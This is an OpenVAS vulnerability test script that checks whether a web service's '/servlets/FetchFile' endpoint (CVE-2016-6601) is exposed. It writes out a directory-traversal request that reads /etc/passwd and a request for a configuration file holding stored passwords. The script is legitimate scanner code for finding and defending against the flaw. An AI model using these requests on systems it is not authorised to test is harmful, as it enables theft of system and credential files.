###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_servlets_FetchFile_mult_vul_08_16.nasl 11647 2018-09-27 09:31:07Z jschulte $
#
# Multiple Vendors '/servlets/FetchFile' Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105858");
  script_version("$Revision: 11647 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2016-6601");

  script_name("Multiple Vendors '/servlets/FetchFile' Multiple Vulnerabilities");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/2712");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40229/");

  script_tag(name:"vuldetect", value:"Try to read files like /etc/passwd or conf/securitydbData.xml.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"Multiple vulnerabilities affecting the remote device have been found, these vulnerabilities allows uploading of arbitrary files and their
  execution, arbitrary file download (with directory traversal), use of a weak algorithm for storing passwords and session hijacking.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-09-27 11:31:07 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-08-09 10:38:38 +0200 (Tue, 09 Aug 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 9090);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port( default:9090 );

files = traversal_files();

foreach file ( keys( files ) )
{
  url = '/servlets/FetchFile?fileName=../../../../../../../' + files[file];
  if( http_vuln_check( port:port,
                       url:url,
                       pattern:file ) )
  {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

# Similar to 2016/gb_securitydbData_xml_disclosure.nasl but
# with an indirect access via the servlet
url = "/servlets/FetchFile?fileName=conf/securitydbData.xml";

if( http_vuln_check( port:port,
                     url:url,
                     pattern:'<AUTHORIZATION-DATA>',
                     extra_check:make_list( "<DATA ownername=", "password=" ) ) )
{
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
